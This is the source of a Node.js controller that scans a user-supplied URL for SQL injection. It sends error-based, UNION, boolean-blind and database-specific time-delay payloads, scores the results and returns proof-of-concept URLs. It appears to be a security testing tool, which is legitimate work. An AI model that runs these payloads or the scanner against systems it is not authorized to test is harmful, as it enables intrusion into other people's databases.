// controllers/sqliController.js
// Use ONLY on targets you are authorized to test.

import { NexposeResult } from "../models/NexposeResult.js";

/* Tunables */
const REQUEST_TIMEOUT_MS = 12000;
const TIME_DELAY_MS = 5000;
const BOOLEAN_DIFF_BYTES = 100;
const BOOLEAN_DIFF_RATIO = 0.2;

/* Signatures / types */
const SQL_ERROR_RX = /sql syntax|mysql_fetch|ORA-|SQLite|sqlite_error|psql|PG::|pg_query|ODBC|TNS-|DB2|SQLServer|SqlException|Query failed|You have an error in your SQL|Warning: mysqli|Unclosed quotation mark|sqlstate/i;

const TYPES = {
  ERROR:  "Error-based",
  UNION:  "Union-based",
  BOOL:   "Boolean-based blind",
  TIME:   "Time-based blind",
  OOB:    "Out-of-band (not attempted)",
};

const ERROR_BASED = [
  "'", "\"",
  "' OR '1'='1", "\" OR \"1\"=\"1",
  "' OR 1=1 -- -", "\" OR 1=1 -- -",
  "') OR ('1'='1", "\") OR (\"1\"=\"1",
];

const UNION_BASED = [
  "1 UNION SELECT NULL-- -",
  "1 UNION SELECT NULL,NULL-- -",
  "1 UNION SELECT NULL,NULL,NULL-- -",
  "1 UNION SELECT 1,2,3-- -",
];

const BOOL_TRUE  = ["1 AND 1=1", "' AND '1'='1", "\" AND \"1\"=\"1"];
const BOOL_FALSE = ["1 AND 1=2", "' AND '1'='2", "\" AND \"1\"=\"2"];

const TIME_BASED = [
  { db: "mysql",    payload: `1 AND SLEEP(${TIME_DELAY_MS / 1000})`,             expectMs: TIME_DELAY_MS },
  { db: "postgres", payload: `1; SELECT pg_sleep(${TIME_DELAY_MS / 1000})--`,    expectMs: TIME_DELAY_MS },
  { db: "mssql",    payload: `1; WAITFOR DELAY '0:0:${TIME_DELAY_MS / 1000}'--`, expectMs: TIME_DELAY_MS },
  { db: "oracle",   payload: `1 AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',${TIME_DELAY_MS / 1000}) FROM DUAL)`, expectMs: TIME_DELAY_MS },
];

/* Helpers */
function withTimeout(ms) {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  return { signal: ctrl.signal, cancel: () => clearTimeout(id) };
}

// SAFE fetch: never throws; returns a uniform record
async function safeFetchTimed(url, init = {}) {
  const { signal, cancel } = withTimeout(REQUEST_TIMEOUT_MS);
  const started = Date.now();
  try {
    const res = await fetch(url, { ...init, signal });
    const text = await res.text().catch(() => "");
    return { ok: true, status: res.status, text, timeMs: Date.now() - started };
  } catch (e) {
    return { ok: false, status: -1, text: "", timeMs: Date.now() - started, error: String(e?.message || e) };
  } finally {
    cancel();
  }
}

function buildRequest(targetUrl, method, paramName, payload, headers, postEncoder = "form") {
  method = (method || "GET").toUpperCase();
  if (method === "POST") {
    if (postEncoder === "json") {
      return {
        url: targetUrl,
        init: { method: "POST", headers: { "Content-Type": "application/json", ...(headers||{}) }, body: JSON.stringify({ [paramName]: payload }) },
        sentTo: `POST JSON.${paramName}`,
      };
    }
    const body = new URLSearchParams({ [paramName]: payload }).toString();
    return {
      url: targetUrl,
      init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", ...(headers||{}) }, body },
      sentTo: `POST form.${paramName}`,
    };
  }
  const u = new URL(targetUrl);
  u.searchParams.set(paramName, payload);
  return { url: u.toString(), init: { method: "GET", headers }, sentTo: `GET query.${paramName}` };
}

const len = s => (s||"").length;

function booleanDeltaOk(baselineLen, aLen, bLen) {
  const d = Math.abs(aLen - bLen);
  if (d >= BOOLEAN_DIFF_BYTES) return true;
  const maxLen = Math.max(baselineLen, aLen, bLen) || 1;
  return (d / maxLen) >= BOOLEAN_DIFF_RATIO;
}

function scoreBand(score) {
  if (score >= 90) return "Critical";
  if (score >= 70) return "High";
  if (score >= 40) return "Medium";
  return score > 0 ? "Low" : "Safe";
}
const normalizeRisk3 = r => (r === "Critical" ? "High" : r === "Info" ? "Low" : (r || "Low"));

/**
 * Body: { url, method?: "GET"|"POST", paramName?: string, headers?: {}, postEncoder?: "form"|"json" }
 */
export const scanSQLi = async (req, res) => {
  const { url, method = "GET", paramName = "test", headers = {}, postEncoder = "form" } = req.body || {};
  if (!url) return res.status(400).json({ message: "URL is required" });

  // Syntactic validation (don’t even try if not http(s))
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") {
      return res.status(400).json({ message: "Invalid URL scheme. Use http(s)." });
    }
  } catch {
    return res.status(400).json({ message: "Invalid URL" });
  }

  const tests = [];
  const errors = [];

  /* Baseline reachability */
  const baseReq = buildRequest(url, method, paramName, "1", headers, postEncoder);
  const base = await safeFetchTimed(baseReq.url, baseReq.init);
  const baseLen = len(base.text);

  // If baseline can’t be fetched, don’t pretend results exist
  if (!base.ok) {
    const response = {
      scanStatus: "unreachable",
      url, method: method.toUpperCase(), paramName,
      payloadsAttempted: 0,
      payloadsSucceeded: 0,
      successRate: 0,
      vulnerable: null,
      riskScore: null,
      riskLevel: null,
      owasp: "OWASP Top 10 2021 — A03: Injection",
      tests: [],
      findings: [],
      findingsCount: 0,
      diagnostics: { baseline: { status: base.status, timeMs: base.timeMs, error: base.error } },
      message: `Target unreachable: ${base.error || "network error"}`,
      recommendations: [
        "Verify the domain resolves and is reachable over the network.",
        "Ensure no firewall/WAF is blocking the scanner.",
        "Scan again once connectivity is confirmed.",
      ],
    };
    return res.status(200).json(response);
  }

  const typesAttempted = [TYPES.ERROR, TYPES.UNION, TYPES.BOOL, TYPES.TIME, TYPES.OOB];

  /* Error-based */
  for (const payload of ERROR_BASED) {
    const cfg = buildRequest(url, method, paramName, payload, headers, postEncoder);
    const r = await safeFetchTimed(cfg.url, cfg.init);
    const foundError = r.ok && SQL_ERROR_RX.test(r.text);
    tests.push({
      type: TYPES.ERROR, param: paramName, method,
      payload, status: r.status, timeMs: r.timeMs, responseLen: len(r.text),
      evidence: foundError ? "DB error pattern found in response" : null,
      pocUrl: method.toUpperCase()==="GET" ? cfg.url : null,
      risk: foundError ? "High" : "Info",
      error: r.ok ? null : r.error,
    });
    if (!r.ok) errors.push({ stage: "error-based", payload, error: r.error });
  }

  /* UNION-based */
  for (const payload of UNION_BASED) {
    const cfg = buildRequest(url, method, paramName, payload, headers, postEncoder);
    const r = await safeFetchTimed(cfg.url, cfg.init);
    const err = r.ok && SQL_ERROR_RX.test(r.text);
    const changed = r.ok && Math.abs(len(r.text) - baseLen) > BOOLEAN_DIFF_BYTES;
    const evidence = err ? "DB error after UNION (columns mismatch?)" : (changed ? "Response length changed after UNION" : null);
    tests.push({
      type: TYPES.UNION, param: paramName, method,
      payload, status: r.status, timeMs: r.timeMs, responseLen: len(r.text),
      evidence, pocUrl: method.toUpperCase()==="GET" ? cfg.url : null,
      risk: evidence ? "High" : "Info",
      error: r.ok ? null : r.error,
    });
    if (!r.ok) errors.push({ stage: "union-based", payload, error: r.error });
  }

  /* Boolean-based blind */
  for (let i=0; i<Math.min(BOOL_TRUE.length, BOOL_FALSE.length); i++) {
    const pTrue = BOOL_TRUE[i], pFalse = BOOL_FALSE[i];
    const cfgT = buildRequest(url, method, paramName, pTrue, headers, postEncoder);
    const cfgF = buildRequest(url, method, paramName, pFalse, headers, postEncoder);
    const rT = await safeFetchTimed(cfgT.url, cfgT.init);
    const rF = await safeFetchTimed(cfgF.url, cfgF.init);
    const different = (rT.ok && rF.ok) && (booleanDeltaOk(baseLen, len(rT.text), len(rF.text)) || rT.status !== rF.status);
    tests.push({
      type: TYPES.BOOL, param: paramName, method,
      payload: `${pTrue} | ${pFalse}`,
      status: `${rT.status}/${rF.status}`,
      timeMs: `${rT.timeMs}/${rF.timeMs}`,
      responseLen: `${len(rT.text)}/${len(rF.text)}`,
      evidence: different ? "True/False responses differ (status or size)" : null,
      pocUrl: method.toUpperCase()==="GET" ? cfgT.url : null,
      risk: different ? "Critical" : "Info",
      error: (!rT.ok || !rF.ok) ? `${rT.error || ""} ${rF.error || ""}`.trim() : null,
    });
    if (!rT.ok) errors.push({ stage: "boolean-true", payload: pTrue, error: rT.error });
    if (!rF.ok) errors.push({ stage: "boolean-false", payload: pFalse, error: rF.error });
  }

  /* Time-based blind */
  for (const t of TIME_BASED) {
    const cfg = buildRequest(url, method, paramName, t.payload, headers, postEncoder);
    const r = await safeFetchTimed(cfg.url, cfg.init);
    const slowed = r.ok && (r.timeMs - (base.timeMs)) >= (t.expectMs - 1500);
    tests.push({
      type: TYPES.TIME, param: paramName, method,
      payload: t.payload, status: r.status, timeMs: r.timeMs, responseLen: len(r.text),
      evidence: slowed ? `Response delayed by ~${t.expectMs/1000}s (${t.db} sleep)` : null,
      pocUrl: method.toUpperCase()==="GET" ? cfg.url : null,
      risk: slowed ? "Critical" : "Info",
      error: r.ok ? null : r.error,
    });
    if (!r.ok) errors.push({ stage: "time-based", payload: t.payload, error: r.error });
  }

  /* Confidence & status */
  const attempted = tests.length;
  const succeeded = tests.filter(t => !t.error && (typeof t.status === "number") && t.status > 0).length;
  const successRate = attempted ? succeeded / attempted : 0;

  let scanStatus = "ok";
  if (successRate === 0) scanStatus = "unreachable";
  else if (successRate < 0.5) scanStatus = "inconclusive";
  else if (successRate < 0.75) scanStatus = "degraded";

  /* Scoring only if results are trustworthy enough */
  const positives = tests.filter(t => !!t.evidence);
  let vulnerable = null, riskScore = null, riskLevel = null, pocUrl = null, vulnerabilityDetails = [];

  if (scanStatus === "ok" || scanStatus === "degraded") {
    vulnerable = positives.length > 0;

    let score = 0;
    if (positives.some(f => f.type === TYPES.TIME))  score += 45;
    if (positives.some(f => f.type === TYPES.BOOL))  score += 40;
    if (positives.some(f => f.type === TYPES.UNION)) score += 30;
    if (positives.some(f => f.type === TYPES.ERROR)) score += 25;
    score += Math.min(positives.length * 3, 15);
    score = Math.min(100, score);
    riskScore = score;
    riskLevel = scoreBand(score);

    const firstPoc = (positives.find(f => f.type === TYPES.BOOL) ||
                      positives.find(f => f.type === TYPES.ERROR) ||
                      positives.find(f => f.type === TYPES.UNION) ||
                      positives.find(f => f.type === TYPES.TIME)) || null;
    pocUrl = firstPoc?.pocUrl || null;

    vulnerabilityDetails = positives.map((f) => ({
      method: f.method.toUpperCase(),
      parameter: f.param,
      payload: f.payload,
      risk: normalizeRisk3(f.risk),
      owasp: "A03:2021 Injection",
    }));
  }

  const coverage = {
    total: attempted,
    byType: {
      [TYPES.ERROR]: tests.filter(f => f.type === TYPES.ERROR).length,
      [TYPES.UNION]: tests.filter(f => f.type === TYPES.UNION).length,
      [TYPES.BOOL]:  tests.filter(f => f.type === TYPES.BOOL).length,
      [TYPES.TIME]:  tests.filter(f => f.type === TYPES.TIME).length,
      [TYPES.OOB]:   0,
    },
    typesAttempted,
  };

  const recommendations = scanStatus === "ok" || scanStatus === "degraded"
    ? (vulnerable ? [
        "Use prepared statements / parameterized queries.",
        "Apply strict server-side input validation.",
        "Avoid string concatenation in SQL; prefer ORM/query builders safely.",
        "Add WAF rules for SQLi patterns and rate-limit suspicious requests.",
      ] : [
        "No SQL Injection detected with tested payloads.",
        "Re-scan periodically; coverage may miss framework-specific cases.",
        "Prefer parameterized queries everywhere.",
      ])
    : [
        "Verify the domain/host is online and reachable.",
        "Check DNS resolution, TLS, proxies, or WAF blocks.",
        "Re-run the scan after connectivity is restored.",
      ];

  const response = {
    scanStatus,                                // <-- NEW
    url, method: method.toUpperCase(), paramName,
    payloadsAttempted: attempted,              // <-- NEW
    payloadsSucceeded: succeeded,              // <-- NEW
    successRate: Number(successRate.toFixed(2)), // <-- NEW (0..1)
    typesAttempted,
    coverage,
    vulnerable,
    riskScore,
    riskLevel,
    owasp: "OWASP Top 10 2021 — A03: Injection",
    tests,                       // ALL test rows (with error notes if any)
    findings: positives,         // Positives only
    findingsCount: positives.length,
    vulnerabilityDetails,
    pocUrl,
    recommendations,
    message:
      scanStatus === "unreachable" ? "Target unreachable — no successful responses."
      : scanStatus === "inconclusive" ? "Scan inconclusive — too many request failures."
      : scanStatus === "degraded" ? "Scan completed with degraded confidence."
      : (vulnerable ? `⚠️ Indicators via: ${[...new Set(positives.map(p => p.type))].join(", ")}`
                     : "✅ No SQL Injection detected with current payloads."),
    diagnostics: {
      baseline: { status: base.status, timeMs: base.timeMs, responseLen: baseLen },
      errorSummary: errors,
    },
  };

  // best-effort persist
  try {
    if (NexposeResult?.create && (scanStatus === "ok" || scanStatus === "degraded")) {
      await NexposeResult.create({
        target: url, method: response.method, param: paramName,
        vulnerable: response.vulnerable, riskScore: response.riskScore, riskLevel: response.riskLevel,
        summary: response.message, findings: response.findings, coverage: response.coverage, pocUrl: response.pocUrl,
      });
    }
  } catch (e) { console.warn("Persist skipped:", e?.message); }

  return res.status(200).json(response);
};

// Optional alias
export { scanSQLi as scanForSQLi };
